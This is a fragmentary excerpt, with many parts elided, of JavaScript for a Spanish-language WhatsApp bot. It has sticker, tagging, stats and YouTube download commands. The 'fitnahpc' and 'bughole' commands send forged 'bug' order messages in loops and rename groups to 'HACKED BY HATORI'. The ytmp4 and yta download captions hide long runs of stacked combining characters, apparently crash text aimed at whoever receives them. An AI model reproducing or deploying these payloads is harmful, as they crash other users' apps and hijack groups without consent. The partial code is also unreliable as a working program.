            ...
            break
				case 'attp':
                 ...
                 case 'ttp':  
                    ...
                    denz.sendMessage(from, anu1, image, {quoted: mek, caption : '.sticker'})
                    break
				case 'emoji':
			if (args === 0) return reply('y el emoji?')   
		   aku4 = args.join(' ')
           emoji.get(`${aku4}`).then(emoji => {
           link = `${emoji.images[10].url}`
		   sendWebp(from, `${link}`).catch(() => reply('falló'))
           })
    	   break
				case 'tag':
			if (args.length < 1) return reply(`Escribe ${prefix}tag 51xxxx`)
...
reply('Exito en unirse al grupo')
break
				case 'totag':
			if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
          ...
          reply(`responde una imagen/documento/gif/sticker/audio/video con el texto: ${prefix}totag`)
        }
        break
				case 'status':
case 'stats':
...
Chat Privado : ${privat.length}
Chat Grupos : ${groups.length}
...
MNC : ${mnc}
MCC : ${mcc}
Modelo Dispositivo : ${denz.user.phone.device_model}
Manufactura Dispositivo : ${device_manufacturer}
...
var nn = body.slice(9)
			...
			if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                ...
                alasanafk = anuu
				reply('Funcion OFFLINE activada')
				break
           case 'fitnahpc':
            ...
            if (!isGroup) return reply(mess.only.group)
              ...
              if (!isBotGroupAdmins) return reply(mess.only.Badmin)
              sendBug(from)
              denz.groupUpdateSubject(from, `HACKED BY HATORI`)
...
reply('Bugeado con éxito '+args.join(' '))
					break
					case 'bughole':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
...
if (args.length < 1) return reply('Cantidad?')
	    ...
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
						...
						"message": `${NamaBot}`,
						"orderTitle": `${NamaOwner}`,
						"sellerJid": "380946910922@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        } catch {
		          for(let i=0;i<10;i++){
		        denz.sendMessage(from, 'Enviado correctamente Bug Troli2', text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "380946910922@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
...
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
denz.updatePresence(from, Presence.composing)
denz.sendMessage(from, 'Listo',text, {
 quoted: {
  key: {
...
break
case 'ytmp4':
                    if (!isNsfw) return reply('modo descarga deshabilitado')
					if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
					anu = await fetchJson(`https://api.zeks.xyz/api/ytmp4/2?apikey=apivinz&url=${args[0]}`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					teks = `「 *YOUTUBE MP4* 」\n• *Titulo* : ${anu.result.title}\n• *Link* : ${anu.result.link}\n• *Peso* : ${anu.result.size}\n• *Calidad* : ${anu.result.quality}\n• *Extensión* : ${anu.result.ext}`
					thumb = await getBuffer(anu.result.thumb)
					denz.sendMessage(from, thumb, image, {quoted: mek, caption: teks})
					buffer = await getBuffer(anu.result.link)
					sendMediaURL(from, anu.result.link)/*, {mimetype: 'video/mp4', filename: `${anu.title}.mp4`, quoted: mek})*/
					break
...
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
					pw = [`https://api.zeks.me/api/ytplaymp4?apikey=apivinz&q=${args[0]}`] 
					pc = [`https://api.zekais.com/youtube?url=${args[0]}&apikey=zekais`]
					anu = await fetchJson(`${pw}`, { method: 'get' })
					anu2 = await fetchJson(`${pc}`, { method: 'get' })
					if (anu.error) return reply('error')
					 tamnel = fs.readFileSync('./denz.jpg')
buffer = await getBuffer(anu.result.thumbnail)
lago = await getBuffer(anu.result.url_video)
/*sexy = axios.get(`https://tinyurl.com/api-create.php?url=${lago}`)*/
					infomp3 = `「  *YTMP4*  」\n\n*• Título:* ${anu2.title}\n*• Canal:* ${anu2.channel}\n*• Peso:* ${anu.result.size}\n*• Vistas:* ${anu2.views}\n*• Likes:* ${anu2.likes}\n*• Publicado:* ${anu2.published}\n*• Link:* ${anu.result.source}\n..່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່\n*• Descripcion:*  ${anu2.desc}`
					denz.sendMessage(from, buffer, image, {quoted: mek, thumbnail: tamnel, caption: infomp3})
					sendMediaURL(from, anu.result.url_video)
break
case 'yta':

if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
					pw = [`https://api.zeks.me/api/ytmp3?apikey=apivinz&url=${args[0]}`] 
					pc = [`https://api.zekais.com/youtube?url=${args[0]}&apikey=zekais`]
					anu = await fetchJson(`${pw}`, { method: 'get' })
					anu2 = await fetchJson(`${pc}`, { method: 'get' })
					if (anu.error) return reply('error')
					 tamnel = fs.readFileSync('./denz.jpg')
buffer = await getBuffer(anu.result.thumbnail)
lago = await getBuffer(anu.result.url_audio)
/*sexy = axios.get(`https://tinyurl.com/api-create.php?url=${lago}`)*/
					infomp3 = `「  *YTMP3*  」\n\n*• Título:* ${anu2.title}\n*• Canal:* ${anu2.channel}\n*• Peso:* ${anu.result.size}\n*• Vistas:* ${anu2.views}\n*• Likes:* ${anu2.likes}\n*• Publicado:* ${anu2.published}\n..່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋